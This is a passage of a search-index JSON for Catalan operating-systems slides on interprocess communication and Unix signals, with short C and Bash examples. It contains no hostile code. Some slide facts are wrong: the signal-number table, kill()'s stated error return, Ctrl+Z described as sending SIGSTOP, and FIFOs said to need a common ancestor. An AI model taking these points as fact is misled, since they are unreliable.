    "text": "Exemple: Comunicació amb pipes (C)\n\n\nint pipe_fd[2];\npipe(pipe_fd);\nif (fork() == 0) { // Fill (lector)\n  close(pipe_fd[1]);\n  char buffer[100];\n  read(pipe_fd[0], buffer, 100);\n  close(pipe_fd[0]);\n  printf(\"Missatge rebut: %s\\n\", buffer);\n} else { // Pare (escriptor)\n  close(pipe_fd[0]);\n  write(pipe_fd[1], \n  \"Missatge des de Process pare\", \n  strlen(\"Missatge des de Process pare\")\n  );\n  close(pipe_fd[1]);\n}\n\n\n\n\npipes.c",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#fifos",
    "href": "slides/03-communicate.html#fifos",
    "title": "Comunicació de processos",
    "section": "FIFOS",
    "text": "FIFOS\n\nFuncionen com els pipes, però amb un mecanisme de comunicació amb nom.\nServeis:\n\nmkfifo(char *name,mode_t mode);\nopen(char *name, int flag);\n\nS’obre un FIFO per r,w, r+w\nAcció bloquejant fins que algun procés estigui a l’altre extrem.\n\nLectura i escriptura (read(), write()).\nTancament amb close().\nEliminació amb unlink().\n\n\n\nEls FIFOs ofereixen una forma de comunicació més flexible entre processos amb l’avantatge afegit de poder ser utilitzats per processos que no comparteixen un antecessor comú.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#exemple-comunicació-amb-fifos-bash",
    "href": "slides/03-communicate.html#exemple-comunicació-amb-fifos-bash",
    "title": "Comunicació de processos",
    "section": " Exemple: Comunicació amb FIFOS (Bash)",
    "text": "Exemple: Comunicació amb FIFOS (Bash)\n\nCrear el FIFO en la terminal 1:\n\nmkfifo fifo_example\n\nExecutarem el process 1 (escriptor) a la terminal 1:\n\necho \"Missatge des de Process 1\" &gt; fifo_example\n\nExecutarem el process 2 (lector) a la terminal 2:\n\ncat &lt; fifo_example\n\nEliminarem el FIFO:\n\nrm fifo_example",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#exemple-comunicació-amb-fifos-c",
    "href": "slides/03-communicate.html#exemple-comunicació-amb-fifos-c",
    "title": "Comunicació de processos",
    "section": "Exemple: Comunicació amb FIFOS (C)",
    "text": "Exemple: Comunicació amb FIFOS (C)\nmkfifo(\"fifo_example\", 0666);\n\n// Process 1 (escriptor)\nint fd = open(\"fifo_example\", O_WRONLY);\nwrite(fd, \"Missatge des de Process 1\", strlen(\"Missatge des de Process 1\"));\nclose(fd);\n\n// Process 2 (lector)\nint fd = open(\"fifo_example\", O_RDONLY);\nchar buffer[100];\nread(fd, buffer, 100);\nclose(fd);\nprintf(\"Missatge rebut: %s\\n\", buffer);\n\n\nunlink(\"fifo_example\");\n\nlector_fifos.c · escriptor_fifos.c",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#cua-de-missatges",
    "href": "slides/03-communicate.html#cua-de-missatges",
    "title": "Comunicació de processos",
    "section": "Cua de missatges",
    "text": "Cua de missatges\n\nComunicació mitjançant pas de missatge de la llibreria IPC.\nMateixa màquina.\nIdentificació: indirecta amb identificador especial idCua.\nAmb nom local.\nAmb buffering.\nUnidireccional.\nSincronització: bloquejant i no bloquejant.\n\n\nOperacions bàsiques:\n\nint msgsnd(int msqid, const void *msgp, size_t msgsz, int msgflg): Envia un missatge msgp de mida msgz a la cua msgid.\nssize_t msgrcv(int msqid,void *msgp, size_t msgsz,long msgtyp,int msgflg): Rep un missatge de la cua msgid i el guarda a msgp.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#ex-comunicació-amb-cua-de-missatges-c---escriptor",
    "href": "slides/03-communicate.html#ex-comunicació-amb-cua-de-missatges-c---escriptor",
    "title": "Comunicació de processos",
    "section": "Ex: Comunicació amb Cua de missatges (C) - Escriptor",
    "text": "Ex: Comunicació amb Cua de missatges (C) - Escriptor\nstruct message {\n    long msg_type;\n    char msg_text[100];\n};\n\nint main() {\n    key_t key = ftok(\"msg_queue_example\", 65);\n    int msqid = msgget(key, 0666 | IPC_CREAT);\n    struct message msg;\n    msg.msg_type = 1;\n    strcpy(msg.msg_text, \"Aquest és un missatge de prova!\");\n    msgsnd(msqid, &msg, sizeof(msg), 0);\n    printf(\"Missatge enviat: %s\\n\", msg.msg_text);\n    return 0;\n}\n\nescriptor_msg.c",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#ex-comunicació-amb-cua-de-missatges-c---lector",
    "href": "slides/03-communicate.html#ex-comunicació-amb-cua-de-missatges-c---lector",
    "title": "Comunicació de processos",
    "section": "Ex: Comunicació amb Cua de missatges (C) - Lector",
    "text": "Ex: Comunicació amb Cua de missatges (C) - Lector\nstruct message {\n    long msg_type;\n    char msg_text[100];\n};\n\nint main() {\n    key_t key = ftok(\"msg_queue_example\", 65);\n    int msqid = msgget(key, 0666 | IPC_CREAT);\n    \n    struct message msg;\n    msgrcv(msqid, &msg, sizeof(msg), 1, 0);\n    printf(\"Missatge rebut: %s\\n\", msg.msg_text);\n    return 0;\n}\n\nlector_msg.c",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#sockets",
    "href": "slides/03-communicate.html#sockets",
    "title": "Comunicació de processos",
    "section": "Sockets",
    "text": "Sockets\nEls sockets són eines fonamentals per a la comunicació entre processos a través d’una xarxa o dins del mateix ordinador. Poden utilitzar-se per a la comunicació mitjançant diferents protocols com TCP/IP o UDP.\n\nComunicació a través de la xarxa o local: Els sockets permeten la comunicació entre processos que poden estar en el mateix ordinador o en diferents ordinadors a través de la xarxa.\nAdreces: Els sockets estan identificats per adreces, com les adreces IP per a la comunicació a través de xarxes o adreces locals per a comunicació dins del mateix ordinador.\nProtocols: Els sockets poden utilitzar diferents protocols com TCP/IP o UDP, segons les necessitats de la comunicació.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#exemple-comunicació-amb-sockets",
    "href": "slides/03-communicate.html#exemple-comunicació-amb-sockets",
    "title": "Comunicació de processos",
    "section": "Exemple: Comunicació amb Sockets",
    "text": "Exemple: Comunicació amb Sockets",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#ex-comunicació-amb-sockets-c",
    "href": "slides/03-communicate.html#ex-comunicació-amb-sockets-c",
    "title": "Comunicació de processos",
    "section": "Ex: Comunicació amb Sockets (C)",
    "text": "Ex: Comunicació amb Sockets (C)\n\n\nServidor\nint sockfd, new_sock;\nstruct sockaddr_in server_addr;\nstruct  sockaddr_in new_addr;\nsocklen_t addr_size;\nchar buffer[100];\n\nsockfd=socket(AF_INET, SOCK_STREAM, 0);\n// Configuració de la connexió...\n// Esperar connexions i llegir\nnew_sock = accept(sockfd, \n(struct sockaddr*)&new_addr, \n&addr_size);\nrecv(new_sock, buffer, 100, 0);\nprintf(\"Missatge rebut: %s\\n\", buffer);\n\nClient\nint sockfd;\nstruct sockaddr_in server_addr;\nchar buffer[100];\n\nsockfd=socket(AF_INET, SOCK_STREAM, 0);\n// Configuració de la connexió...\n\n// Enviar missatge al servidor\nsend(sockfd,\"Missatge des del client\",\nstrlen(\"Missatge des del client\"), 0);\n\n\nclient_socket.c · server_socket.c",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#memòria-compartida-1",
    "href": "slides/03-communicate.html#memòria-compartida-1",
    "title": "Comunicació de processos",
    "section": "Memòria compartida",
    "text": "Memòria compartida\nLa comunicació mitjançant memòria compartida implica compartir una àrea de memòria entre diferents processos o fils d’execució d’un mateix procés. Aquest àrea de memòria és accessible per a tots els fils d’execució involucrats, permetent un accés directe i eficient a les dades compartides.\n\nEspai d’adreçament únic: Fils d’execució d’un procés.\nMúltiples espai d’adreces: Zones de Memòria que són accessibles per processos diferents.\nS’ha de controlar/sincronitzar l’accés a les dades compartides per assegurar la consistència de les dades amb mecanismes com semàfors, mutex o candaus.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#ex-comunicació-amb-memòria-compartida-c",
    "href": "slides/03-communicate.html#ex-comunicació-amb-memòria-compartida-c",
    "title": "Comunicació de processos",
    "section": "Ex: Comunicació amb Memòria Compartida (C)",
    "text": "Ex: Comunicació amb Memòria Compartida (C)\nkey_t key = ftok(\"fitxer_clau\", 'R');\nint shmid = shmget(key, 1024, 0666 | IPC_CREAT);\nchar *shared_memory = (char *)shmat(shmid, (void *)0, 0);\n\n// Escriure dades a la memòria compartida\nstrcpy(shared_memory, \"Missatge a la memòria compartida\");\n\n// Llegir dades de la memòria compartida\nprintf(\"Missatge llegit: %s\\n\", shared_memory);\n\n// Alliberar memòria compartida\nshmdt((void *)shared_memory);\nshmctl(shmid, IPC_RMID, NULL);",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#llibreries-de-memòria-compartida",
    "href": "slides/03-communicate.html#llibreries-de-memòria-compartida",
    "title": "Comunicació de processos",
    "section": "Llibreries de Memòria compartida",
    "text": "Llibreries de Memòria compartida\n\npthread (POSIX Threads): És una interfície estàndard que facilita la creació i gestió de fils d’execució (threads) en C. Permet als processos tenir múltiples fils d’execució que comparteixen memòria i recursos.\nOpenMP: És una API que facilita la programació paral·lela. Permet als desenvolupadors marcar parts del codi com a regions paral·leles, que s’executaran de forma concurrent en diferents fils d’execució.\n\n\npthread_mc.c · openmp_mc.c",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#comparacióselecció-de-mecanismes-de-comunicació",
    "href": "slides/03-communicate.html#comparacióselecció-de-mecanismes-de-comunicació",
    "title": "Comunicació de processos",
    "section": "Comparació/Selecció de mecanismes de comunicació",
    "text": "Comparació/Selecció de mecanismes de comunicació\n\nFitxers: Comunicació temporal de dades. No recomanat.\nPipes: Comunicació unidireccional entre processos amb un antecessor comú.\nFIFOS: Comunicació unidireccional entre processos amb un antecessor comú.\nCues de missatges: Quan es necessita enviar missatges amb sincronització asíncrona i buffering.\nSockets: Comunicació a través de la xarxa o local.\nMemòria compartida: Quan es necessita accedir ràpidament a dades compartides entre processos.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#això-és-tot-per-avui",
    "href": "slides/03-communicate.html#això-és-tot-per-avui",
    "title": "Comunicació de processos",
    "section": "Això és tot per avui",
    "text": "Això és tot per avui\n\n\nTAKE HOME MESSAGE\nLa comunicació entre processos és essencial per a la coordinació i sincronització en sistemes operatius multiprogramats o distribuïts. Hi ha diversos mecanismes de comunicació, cadascun amb les seves pròpies característiques, avantatges i limitacions. La selecció del mecanisme adequat depèn de les necessitats específiques de l’aplicació, com la velocitat, la complexitat i l’escala de la comunicació requerida.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Comunicació entre processos"
    ]
  },
  {
    "objectID": "slides/03-signals.html#què-són-els-senyals",
    "href": "slides/03-signals.html#què-són-els-senyals",
    "title": "Senyals",
    "section": "Què són els senyals?",
    "text": "Què són els senyals?\nUn senyal és una notificació asíncrona enviada pel nucli a un procés per informar d’un esdeveniment (com una excepció o acció de l’usuari).\nint x = 0;\nint y = 5 / x;\n\nEl procés A s’executa en mode usuari.\nEs produeix una excepció (divisió per zero).\nEl nucli detecta l’error i envia al procés un senyal SIGFPE.\nEl procés pot tenir una rutina de tractament o seguir l’acció per defecte (acabar).\nEl procés A es finalitza, degut al Gestor de senyals.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#flux-dels-esdeveniments",
    "href": "slides/03-signals.html#flux-dels-esdeveniments",
    "title": "Senyals",
    "section": "Flux dels esdeveniments",
    "text": "Flux dels esdeveniments\n\n\n\n\n\nsequenceDiagram \n    participant K as Nucli\n    participant A as Procés A\n    A-&gt;&gt;K: Excepció (divisió per zero)\n    K-&gt;&gt;A: Envia senyal SIGFPE al procés A\n    A-&gt;&gt;A: Té rutina de gestió de senyal?\n    alt Sí\n        A-&gt;&gt;A: Executa rutina de gestió de senyal\n    else No\n        A-&gt;&gt;K: Acció per defecte (finalitza procés)\n    end",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#tipus-desdeveniments",
    "href": "slides/03-signals.html#tipus-desdeveniments",
    "title": "Senyals",
    "section": "Tipus d’esdeveniments",
    "text": "Tipus d’esdeveniments\nEls esdeveniments que generen senyals poden provenir de maquinari o programari.\n\n\n\n\n\n\n\n\n\n\nTipus\nOrigen\nGestió\nExemple\nDestinació\n\n\n\n\nInterrupció HW\nDispositiu extern\nGestor d’interrupcions\nTick del temporitzador\nNucli\n\n\nExcepció SW\nInstrucció errònia\nNucli → envia senyal\nDivisió per zero → SIGFPE\nProcés causant\n\n\nSenyal\nUsuari, procés o nucli\nkill(), signal()\nkill(pid, SIGTERM)\nProcés destinatari",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#exemple-pràctic",
    "href": "slides/03-signals.html#exemple-pràctic",
    "title": "Senyals",
    "section": "Exemple pràctic",
    "text": "Exemple pràctic\nQuants senyals estem enviant? Quines? Quina acció fa el procés quan rep els senyals?\n\n\nyes &gt; /dev/null\nctrl+z\nbg\nctrl+c\n\n\n\n\n\n\nCombinació\nSenyal\nEfecte per defecte\nEstat\n\n\n\n\nCtrl+C\nSIGINT\nTerminar procés\nMort\n\n\nCtrl+Z\nSIGTSTP\nAturar procés\nStopped\n\n\nbg\nSIGCONT\nReprendre en segon pla\nRunning\n\n\nfg\nSIGCONT\nReprendre en primer pla\nRunning\n\n\n\n\n\nQuants senyals estem enviant? 3\nQuines? SIGTSTP, SIGINT, SIGCONT\nQuina acció fa el procés quan rep les senyals? Aturar l’execució en primer pla i portar el procés a segon pla. Arrancar l’execució en segon pla. Acabar el procés.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#exemple-pràctic-pas-a-pas",
    "href": "slides/03-signals.html#exemple-pràctic-pas-a-pas",
    "title": "Senyals",
    "section": "Exemple pràctic: Pas a Pas",
    "text": "Exemple pràctic: Pas a Pas\n\nLa comanda yes&gt;/dev/null crearà un procés A i s’executa al primer pla, quan un usuari pitjà el ctrl-z, el kernel automàticament envia un senyal SIGSTOP al procés A, que modifica el seu estat d’execució a parat i també marxa del primer pla al segon pla.\nDesprés amb la comanda bg, el kernel tramet al procés el senyal SIGCONT i continua la seva execució en segon pla quan la rep. Una altra manera equivalent per realitzar aquest procés és yes&gt;/dev/null & on & ens envia l’ordre directament en execució al background.\nObserveu també com de forma similar la comanda fg; en aquest cas el kernel tramet SIGCONT i el procés quan rep SIGCONT; torna a executar-se al primer pla. Noteu que amb ctrl-c tenim un comportament similar; i el procés en primer pla és acabat en rebre el senyal SIGINT (ctrl+c).",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#diagrama-de-canvis-destat",
    "href": "slides/03-signals.html#diagrama-de-canvis-destat",
    "title": "Senyals",
    "section": "Diagrama de canvis d’estat",
    "text": "Diagrama de canvis d’estat",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#esdeveniments-síncrons-i-asíncrons",
    "href": "slides/03-signals.html#esdeveniments-síncrons-i-asíncrons",
    "title": "Senyals",
    "section": "Esdeveniments síncrons i asíncrons",
    "text": "Esdeveniments síncrons i asíncrons\n\n\n\n\n\n\n\n\nTipus d’esdeveniment\nExemple\nSincronia\n\n\n\n\nExcepció (SIGFPE)\nDivisió per zero\nSíncron amb l’execució\n\n\nSenyal extern (SIGINT)\nCtrl+C\nAsíncron (pot arribar en qualsevol moment)\n\n\n\n\nUn esdeveniment és síncron quan està relacionat amb l’execució del procés, per exemple una excepció com la divisió per zero o un error de segmentació. En aquest cas el procés que ha causat l’esdeveniment és el mateix que rep el senyal.\nUn esdeveniment és asíncron quan no està relacionat amb l’execució del procés, per exemple una interrupció de maquinari o una acció de l’usuari com un ctrl+c. En aquest cas el procés que ha causat l’esdeveniment és diferent del procés que rep el senyal.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#esquema-general",
    "href": "slides/03-signals.html#esquema-general",
    "title": "Senyals",
    "section": "Esquema general",
    "text": "Esquema general",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#rutines-de-tractament-de-senyals",
    "href": "slides/03-signals.html#rutines-de-tractament-de-senyals",
    "title": "Senyals",
    "section": "Rutines de Tractament de senyals",
    "text": "Rutines de Tractament de senyals\nQuan el procés rebi el senyal signum executarà gestor, que pot ser una funció o SIG_DFL, acció per defecte, o SIG_IGN per ignorar el senyal.\n#include &lt;signal.h&gt; \ntypedef void (*sighandler_t)(int);\nsighandler_t signal(int signum, sighandler_t gestor);\nValors de retorn\n\nEn cas d’èxit retorna un punter a la anterior funció gestora del senyal.\nEn cas d’error, retorna SIG_ERR.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#pause",
    "href": "slides/03-signals.html#pause",
    "title": "Senyals",
    "section": "pause()",
    "text": "pause()\nLa crida a sistema pause() s’utilitza per posar en espera un procés fins que rep un senyal.\n#include &lt;unistd.h&gt; \nint pause(void);\n\nSempré retorna -1.\nEs bloqueja fins que el procés rep un senyal (qualsevol).",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#gestió-interna-de-senyals-kernel",
    "href": "slides/03-signals.html#gestió-interna-de-senyals-kernel",
    "title": "Senyals",
    "section": "Gestió interna de senyals (Kernel)",
    "text": "Gestió interna de senyals (Kernel)\n\n\n\n\n\nsequenceDiagram\n    participant U as CPU · Mode Usuari\n    participant K as Nucli\n    participant P as PCB del Procés\n\n    U-&gt;&gt;K: Interrupció / Excepció / Syscall\n    K-&gt;&gt;P: Marca senyal SIGINT com a pendent · signal_pending |= SIGINT\n    K-&gt;&gt;P: Actualitza cua de senyals i màscara\n    K-&gt;&gt;U: Retorna del mode nucli → mode usuari\n    U-&gt;&gt;P: Comprova senyals pendents · signal_pending & ~signal_mask\n    alt Senyal amb handler\n        U-&gt;&gt;P: Executa rutina del senyal user handler\n    else Acció per defecte\n        U-&gt;&gt;K: Finalitza procés (SIG_DFL)\n    end",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#crides-a-sistema",
    "href": "slides/03-signals.html#crides-a-sistema",
    "title": "Senyals",
    "section": "Crides a sistema",
    "text": "Crides a sistema\n\n\n\n\n\n\n\n\nCrida\nFunció\nAcció sobre el PCB\n\n\n\n\nsigprocmask(int how, const sigset_t *set, sigset_t *oldset)\nBloqueja o desbloqueja senyals.\nModifica signal_mask.\n\n\nsigpending(sigset_t *set)\nConsulta els senyals pendents.\nLlegeix signal_pending.\n\n\nsigaction(int signum, const struct sigaction *act, struct sigaction *oldact)\nDefineix un manejador per un senyal concret.\nModifica handlers[].\n\n\nsigqueue(pid_t pid, int sig, const union sigval value)\nEnvia un senyal amb una dada associada.\nAfegeix entrada a queue.\n\n\nalarm(unsigned int sec)\nPrograma l’enviament de SIGALRM.\nConfigura alarm_timer.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#gestió-de-senyals-en-c",
    "href": "slides/03-signals.html#gestió-de-senyals-en-c",
    "title": "Senyals",
    "section": "Gestió de senyals en C",
    "text": "Gestió de senyals en C\n#include &lt;signal.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nvoid handler(int sig) {\n    printf(\"Rebut senyal %d\\n\", sig);\n}\n\nint main() {\n    signal(SIGINT, handler);\n    while (1) pause();\n}\n\nAquesta és la sintaxis tradicional per incloure la gestió de senyals en C.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#sigaction",
    "href": "slides/03-signals.html#sigaction",
    "title": "Senyals",
    "section": "sigaction",
    "text": "sigaction\n#include &lt;signal.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nvoid handler(int sig) {\n    write(1, \"SIGINT rebut\\n\", 13);\n}\n\nint main(void) {\n    struct sigaction sa;\n    sa.sa_handler = handler;\n    sigemptyset(&sa.sa_mask);\n    sa.sa_flags = 0;\n\n    sigaction(SIGINT, &sa, NULL);\n\n    while (1) pause();\n}\n\nAquesta és més moderna i segura.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#accions-per-defecte",
    "href": "slides/03-signals.html#accions-per-defecte",
    "title": "Senyals",
    "section": "Accions per defecte",
    "text": "Accions per defecte\nCada senyal té una acció per defecte. Algunes possibles accions són:\n\nIgnorar el senyal (SIG_IGN).\nFinalitzar el procés (abnormal termination).\nFinalitzar el procés i generar un core dump (abnormal termination with core dump).\nAturar el procés (aturar el procés).\nReprendre el procés (continuar el procés).",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#senyals-que-no-es-poden-capturar",
    "href": "slides/03-signals.html#senyals-que-no-es-poden-capturar",
    "title": "Senyals",
    "section": "Senyals que no es poden capturar",
    "text": "Senyals que no es poden capturar\nEls senyals SIGKILL i SIGSTOP no poden ser capturats ni ignorats. Per tant, no podreu modificar el comportament per defecte per raons òbvies de seguretat. Això garanteix que el nucli i l’usuari sempre puguin aturar o matar un procés mal comportat.\n\nSIGKILL: Finalitza el procés immediatament. kill -SIGKILL pid\nSIGSTOP: Atura el procés immediatament. kill -SIGSTOP pid",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#enviament-de-senyals",
    "href": "slides/03-signals.html#enviament-de-senyals",
    "title": "Senyals",
    "section": "Enviament de senyals",
    "text": "Enviament de senyals\nPer enviar senyals a altres processos s’utilitza la crida a sistema kill().\n#include &lt;signal.h&gt;\nint kill(pid_t pid, int sig);\nEnvia el senyal sig al/s procés/ssos segons pid:\n\npid &gt; 0 : S’envia al procés receptor.\npid = 0 : S’envia als processos del mateix grup que l’emissor.\npid = -1 : S’envia a tots els processos als quals el procés té permís per enviar senyals.\npid &lt; -1 : S’envia a tots els processos l’id del grup que coincideixi amb el valor absolut de pid.\n\n\nValors de retorn\n\nEn cas d’èxit, s’ha enviat com a mínim un senyal, es retorna zero.\nEn cas d’error, retorna SIG_ERR",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#cas-pràctic-problema-típic",
    "href": "slides/03-signals.html#cas-pràctic-problema-típic",
    "title": "Senyals",
    "section": "Cas pràctic: Problema típic",
    "text": "Cas pràctic: Problema típic\nint main(void) {\n   FILE *f = fopen(\"temp.txt\", \"w\");\n   fprintf(f, \"Hola\\n\");\n   fclose(f);\n   remove(\"temp.txt\");\n}\n\nSi el procés s’executa sense interrupcions, el fitxer temporal temp.txt es crea, s’escriu “Hola”, es tanca i s’elimina correctament.\nSi el procés rep un SIGINT (Ctrl+C) abans de tancar el fitxer, el fitxer temporal temp.txt no es tancarà correctament o no s’eliminarà. Això pot provocar pèrdua de dades o corrupció del fitxer.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#solució-amb-gestió-de-senyals",
    "href": "slides/03-signals.html#solució-amb-gestió-de-senyals",
    "title": "Senyals",
    "section": "Solució amb gestió de senyals",
    "text": "Solució amb gestió de senyals\n#include &lt;signal.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nFILE *f;\nvoid cleanup(int sig) {\n    fclose(f);\n    remove(\"temp.txt\");\n    exit(1);\n}\n\nint main(void) {\n    struct sigaction sa = {.sa_handler = cleanup};\n    sigaction(SIGINT, &sa, NULL);\n    f = fopen(\"temp.txt\", \"w\");\n    pause();\n}",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#cas-pràctic-error-típic",
    "href": "slides/03-signals.html#cas-pràctic-error-típic",
    "title": "Senyals",
    "section": "Cas pràctic: Error típic",
    "text": "Cas pràctic: Error típic\nLes rutines de senyals s’executen de forma asíncrona: únicament han de fer operacions async-signal-safe, és a dir, mai es poden cridar funcions com malloc(), printf(), etc.\nvoid handler(int sig) {\n    // ❌ Error típic: malloc() no és async-signal-safe\n    char *buf = malloc(100);  \n    write(1, \"SIGINT rebut\\n\", 13);  // ✅ write() és segura dins del handler\n    free(buf);\n}\nUna funció és async-signal-safe si no provoca comportament indefinit o corrupció de memòria.Només es poden cridar funcions que no depenguin de recursos globals compartits que puguin estar en un estat inconsistent. En aquest cas, malloc() i free() no són segures perquè poden modificar l’estat intern del gestor de memòria, acabant en corrupció de memòria heap.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#taula-resum-de-senyals",
    "href": "slides/03-signals.html#taula-resum-de-senyals",
    "title": "Senyals",
    "section": "Taula resum de senyals",
    "text": "Taula resum de senyals\n\n\n\nSenyal\nID\nDescripció\nAcció per defecte\n\n\n\n\nSIGABRT\n6\nAbort\nTerminació\n\n\nSIGALRM\n14\nTemporitzador\nTerminació\n\n\nSIGCONT\n25\nReprendre\nContinuar\n\n\nSIGFPE\n8\nError aritmètic\nTerminació\n\n\nSIGKILL\n9\nFinalització forçada\nNo capturable\n\n\nSIGINT\n2\nInterrupció usuari (Ctrl+C)\nTerminació\n\n\nSIGUSR1\n16\nSenyal definit per l’usuari\nTerminació",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#timers-al-nucli",
    "href": "slides/03-signals.html#timers-al-nucli",
    "title": "Senyals",
    "section": "Timers al nucli",
    "text": "Timers al nucli\nEl nucli manté un repositor de timers (estructures internes, sovint per PCB o grup de processos) que compta el temps restant per a cada procés o alarm.\n\n\n\n\n\n\nsequenceDiagram\n    participant Kernel\n    participant Procés\n\n    Kernel-&gt;&gt;Kernel: Compta temps timers\n    alt Timer expira\n        Kernel-&gt;&gt;Procés: Envia SIGALRM\n    end\n\n\n\n\n\n\n\nQuan expira un timer, el nucli genera un senyal SIGALRM i el posa a la cua de senyals del procés destinatari.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#alarm-i-pcb-process-control-block",
    "href": "slides/03-signals.html#alarm-i-pcb-process-control-block",
    "title": "Senyals",
    "section": "Alarm() i PCB (Process Control Block)",
    "text": "Alarm() i PCB (Process Control Block)\nQuan un procés crida alarm(sec), el kernel:\n\nGuarda el temps restant al PCB del procés (pcb-&gt;alarm_timer).\nPrograma el timer al scheduler o al timer interrupt handler.\nQuan el temps expira, el kernel envia SIGALRM al procés.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#alarm-a-userspace",
    "href": "slides/03-signals.html#alarm-a-userspace",
    "title": "Senyals",
    "section": "alarm() a userspace",
    "text": "alarm() a userspace\nEl procés s’envia a si mateix després de sec segons un senyal SIGALRM. Retorna el nombre de segons pendents si hi havia una crida a alarm anterior, o zero en altre cas.\n#include &lt;unistd.h&gt; C\nunsigned int alarm(unsigned int sec);\n\n\n\n\n\n\n\nDesactivar alarmes\n\n\nPer desactivar una alarma pendent, es pot cridar a alarm(0), aquesta comanda cancel·la qualsevol alarma pendent.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#resum",
    "href": "slides/03-signals.html#resum",
    "title": "Senyals",
    "section": "Resum",
    "text": "Resum",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#això-és-tot-per-avui",
    "href": "slides/03-signals.html#això-és-tot-per-avui",
    "title": "Senyals",
    "section": "Això és tot per avui",
    "text": "Això és tot per avui\n\n\nTAKE HOME MESSAGE\n\nEls senyals són una eina de notificació entre el nucli i els processos.\nEls senyals poden ser enviats per l’usuari, per altres processos o pel mateix procés.\nEls senyals poden ser gestionats pel procés o executar l’acció per defecte.\nEls senyals es poden enviar amb la crida a sistema kill().\nEls processos poden definir rutines de tractament de senyals amb la crida a sistema signal().\nEls processos poden esperar senyals amb la crida a sistema",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Senyals"
    ]
  },
  {
    "objectID": "slides/03-pipes.html#implementació-de-les-pipes",
